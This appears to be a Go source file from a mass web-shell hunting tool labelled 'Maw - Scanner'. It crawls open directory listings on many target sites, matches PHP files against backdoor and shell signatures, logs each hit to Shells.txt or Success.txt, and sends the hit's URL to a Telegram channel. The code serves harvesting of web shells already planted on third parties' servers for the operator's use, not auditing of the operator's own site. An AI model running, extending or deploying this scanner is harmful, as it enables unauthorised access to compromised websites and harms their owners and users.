package core

import (
	"fmt"
	"net/http"
	"sync"
)

func Exploiter(client *http.Client, site string, directories []string, results chan<- string) {
	defer func() { _ = recover() }()

	url := "https://" + URLDomain(site)
	for _, path := range directories {
		contents, err := SendRequest(client, url, path)
		if err == nil && contents != "" && IndexOf(contents) {
			listDirs := Extract(contents, "Files")
			if listDirs != nil {
				for _, elements := range TrustedFiles {
					listDirs = RemoveElement(listDirs, elements+".php")
				}
				for _, myDir := range listDirs {
					if ExtractFiles(myDir) {
						if scanFile(client, url, path, myDir, results) {
							return
						}
					}
					if ExtractFolders(myDir) {
						if scanFolder(client, url, path, myDir, results) {
							return
						}
					}
				}
			}
		} else {
			results <- fmt.Sprintf("[Maw - Scanner] - %s %s [Searching ..]", url, FR)
		}
	}
}

func scanFile(client *http.Client, url, path, fileName string, results chan<- string) bool {
	filePath := path + fileName
	Request_Text, err := SendRequest(client, url, filePath)
	if err == nil {
		matched := false
		for _, sign := range Signs {
			if CheckBackdoors(Request_Text, sign) != "" {
				for _, shells := range Strings_Shells {
					if CheckBackdoors(Request_Text, shells) != "" {
						results <- fmt.Sprintf("[Maw - Scanner] - %s %s [HORE!]", url, FG)
						AppendToFile(Maw+"/Shells.txt", url+filePath+"\n")
						SendToTelegram(url + filePath)
						return true
					}
				}
				results <- fmt.Sprintf("[Maw - Scanner] - %s %s [HORE!]", url, FG)
				AppendToFile(Maw+"/Success.txt", url+filePath+"\n")
				SendToTelegram(url + filePath)
				matched = true
				break
			}
		}
		if matched {
			return true
		}
		results <- fmt.Sprintf("[Maw - Scanner] - %s %s [Searching ..]", url, FR)
	} else {
		results <- fmt.Sprintf("[Maw - Scanner] - %s %s [Searching ..]", url, FR)
	}
	return false
}

func scanFolder(client *http.Client, url, path, folderName string, results chan<- string) bool {
	contents2, err := SendRequest(client, url, path+"/"+folderName)
	if err == nil {
		listDirs2 := Extract(contents2, "Files")
		if listDirs2 != nil {
			for _, elements := range TrustedFiles {
				listDirs2 = RemoveElement(listDirs2, elements+".php")
			}
			for _, myDir2 := range listDirs2 {
				if ExtractFiles(myDir2) {
					if scanFile(client, url, path, myDir2, results) {
						return true
					}
				}
			}
		}
	}
	return false
}

func CmsCheckers(site string, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	client := NewHTTPClient()
	Exploiter(client, site, Locations, results)
}
